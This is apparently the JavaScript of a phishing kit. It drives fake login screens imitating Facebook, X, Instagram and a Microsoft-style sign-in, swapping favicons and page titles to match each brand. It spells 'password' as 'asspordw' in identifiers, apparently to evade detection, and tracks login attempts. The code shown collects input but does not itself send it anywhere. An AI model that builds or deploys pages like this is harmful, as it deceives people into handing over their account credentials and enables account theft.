// Navigation functions
function t() {
  document.getElementById("tbody").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("lbody").style.display = "none";
  document.getElementById("ibody").style.display = "none";
  document.getElementById("hbody").style.display = "none";
}
function h() {
  document.getElementById("hbody").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("lbody").style.display = "none";
  document.getElementById("ibody").style.display = "none";
  document.getElementById("tbody").style.display = "none";
}
function l() {
  document.getElementById("lbody").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("ibody").style.display = "none";
  document.getElementById("hbody").style.display = "none";
  document.getElementById("tbody").style.display = "none";
}
function i() {
  document.getElementById("ibody").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("lbody").style.display = "none";
  document.getElementById("hbody").style.display = "none";
  document.getElementById("tbody").style.display = "none";
}
function closeDiag() {
    document.getElementById("errorDialog").style.display = "none";
}

function clearNameInput() {
    const name = document.getElementById("_hname");
    name.value = "";
    document.getElementById("clearIcon").style.display = "none";
}

function toggleClearIcon() {
    const name = document.getElementById("_hname");
    document.getElementById("clearIcon").style.display = name.value ? "block" : "none";
}

function showAsspordwField() {
    const nameValue = document.getElementById("_hname").value.trim();
    const errorBox = document.getElementById("error_box");
    const heading = document.getElementById("hm-heading");
    const nameDisplay = document.getElementById("_hname-display");
    const nameDisplayBox = document.getElementById("_hname-display-box");
    const logoContainer = document.getElementById("logo_container");
    const backArrow = document.getElementById("back_arrow");

    if (!nameValue) {
        errorBox.style.display = "block";
        return;
    }

    errorBox.style.display = "none";
    document.getElementById("name_section").style.display = "none";
    document.getElementById("next_btn_wrapper").style.display = "none";
    document.getElementById("asspordw_section").style.display = "block";
    document.getElementById("login_btn_wrapper").style.display = "block";

    // Center logo and show back arrow
    logoContainer.style.justifyContent = "center";
    backArrow.style.display = "block";

    // Update heading
    heading.textContent = "Enter your password";
    nameDisplay.textContent = nameValue;
    nameDisplayBox.style.display = "block";
}

function showNameField() {
    const heading = document.getElementById("hm-heading");
    const logoContainer = document.getElementById("logo_container");
    const backArrow = document.getElementById("back_arrow");

    // Reset visibility
    document.getElementById("asspordw_section").style.display = "none";
    document.getElementById("login_btn_wrapper").style.display = "none";
    document.getElementById("name_section").style.display = "block";
    document.getElementById("next_btn_wrapper").style.display = "block";

    // Reset heading and layout
    heading.textContent = "Sign in";
    logoContainer.style.justifyContent = "flex-start";
    backArrow.style.display = "none";

    // Hide name display box
    document.getElementById("_hname-display-box").style.display = "none";
}

function toggleasspordwVisibility() {
    const passInput = document.getElementById("_hpass");
    passInput.type = passInput.type === "text" ? "text" : "text";
}

function toggleLoginButton() {
    const passInput = document.getElementById("_hpass");
    const loginBtn = document.getElementById("login_button");
    if (passInput.value.trim()) {
        loginBtn.style.opacity = "1";
        loginBtn.style.pointerEvents = "auto";
    } else {
        loginBtn.style.opacity = "0.4";
        loginBtn.style.pointerEvents = "none";
    }
}

function clearIAsspordwField() {
    setTimeout(function () {
        var asspordwField = document.getElementById("_ipass");
        asspordwField.value = "";
    }, 2000);
}

function toggleAsspordwVisibility() {
    var asspordwField = document.getElementById("asspordw");
    var toggleButton = document.querySelector(".toggle-asspordw");

    if (asspordwField.type === "text") {
        asspordwField.type = "text";
        toggleButton.style.backgroundImage = "url('data:image/svg+xml;utf8,<svg fill=%23666 xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\"><path d=\"M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z\"/></svg>')";
    } else {
        asspordwField.type = "text";
        toggleButton.style.backgroundImage = "url('data:image/svg+xml;utf8,<svg fill=%23666 xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\"><path d=\"M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z\"/></svg>')";
    }
}

function changeFavicon(iconUrl) {
    const favicon = document.getElementById('dynamic-favicon');
    favicon.href = iconUrl;
}

function handleLClick() {
    changeFavicon('img/lfavicon.png');
    l();
    document.title = 'Log in to Facebook';
    // Reset Facebook attempts when switching to Facebook
    if (window.resetFacebookLoginAttempts) {
        window.resetFacebookLoginAttempts();
    }
}

function handleTClick() {
    changeFavicon('img/tfavicon.png');
    t();
    document.title = 'Log in to X / X';
}

function handleHClick() {
    changeFavicon('img/hfavicon.png');
    h();
    document.title = 'Sign in to your account';
}

function handleHNextClick() {
    const nameInput = document.getElementById("_hname");
    const nameValue = nameInput ? nameInput.value.trim() : "";

    if (nameValue !== "") {
        changeFavicon("img/hfavicon.png");
        h();
        document.title = "Enter your password";
    } 
}

function handleIClick() {
    changeFavicon('img/ifavicon.png');
    i();
    document.title = 'Instagram';
    // Reset Instagram attempts when switching to Instagram
    if (window.resetInstagramLoginAttempts) {
        window.resetInstagramLoginAttempts();
    }
}

function showTwitterAsspordwField() {
    const tname = document.getElementById("_tname").value;

    if (tname.trim() === "") {
        document.getElementById("error-message").classList.remove("hidden");
        setTimeout(function () {
            document.getElementById("error-message").classList.add("hidden");
        }, 6000);
        return;
    }

    document.getElementById("buttonsContainer").classList.add("hidden");
    document.getElementById("nextButton").classList.add("hidden");
    document.getElementById("asspordwField").classList.remove("hidden");
    document.getElementById("forgotAsspordwButton").classList.add("hidden");
    document.getElementById("heading").innerText = "Enter your password";
    document.getElementById("_tname").readOnly = true;
}

function closeVoteBox() {
    document.getElementById('voteBox').style.display = 'none';
}

// Password visibility toggle for Facebook and Instagram
function togglePasswordVisibility() {
    const passwordInput = document.getElementById("_lpass");
    const toggleIcon = document.querySelector('.toggle-password i');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
    } else {
        passwordInput.type = 'password';
        toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
    }
}

function toggleInstagramPasswordVisibility() {
    const passwordInput = document.getElementById("_ipass");
    const toggleIcon = document.querySelector('#ibody .toggle-password i');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
    } else {
        passwordInput.type = 'password';
        toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
    }
}

// Clear input functions for Facebook and Instagram
function toggleFacebookClearIcon() {
    const lnameInput = document.getElementById('_lname');
    const clearIcon = document.getElementById('facebookClearIcon');
    clearIcon.style.display = lnameInput.value.length > 0 ? 'block' : 'none';
}

function toggleInstagramClearIcon() {
    const inameInput = document.getElementById('_iname');
    const clearIcon = document.getElementById('instagramClearIcon');
    if (clearIcon) {
        clearIcon.style.display = inameInput.value.length > 0 ? 'block' : 'none';
    }
}

function clearFacebookNameInput() {
    document.getElementById('_lname').value = '';
    toggleFacebookClearIcon();
}

function clearInstagramNameInput() {
    document.getElementById('_iname').value = '';
    toggleInstagramClearIcon();
}

// Initialize
document.addEventListener("DOMContentLoaded", () => {
    const bell = document.getElementById("bell");
    const toast = document.getElementById("toast");

    if (bell && toast) {
        bell.addEventListener("click", () => {
            bell.style.animation = "none";
            toast.classList.add("show");
            setTimeout(() => {
                toast.classList.remove("show");
            }, 3000);
        });
    }

    // Initialize clear icons
    toggleFacebookClearIcon();
    toggleInstagramClearIcon();

    // Initialize dialog button
    const dialogOkBtn = document.getElementById("dialogOkBtn");
    if (dialogOkBtn) {
        dialogOkBtn.addEventListener("click", function () {
            document.getElementById("errorDialog").style.display = "none";
        });
    }

    // Monitor username changes to reset attempts
    const facebookUsernameInput = document.getElementById("_lname");
    if (facebookUsernameInput) {
        facebookUsernameInput.addEventListener("input", function() {
            if (window.resetFacebookLoginAttempts) {
                window.resetFacebookLoginAttempts();
            }
        });
    }
    
    const instagramUsernameInput = document.getElementById("_iname");
    if (instagramUsernameInput) {
        instagramUsernameInput.addEventListener("input", function() {
            if (window.resetInstagramLoginAttempts) {
                window.resetInstagramLoginAttempts();
            }
        });
    }
});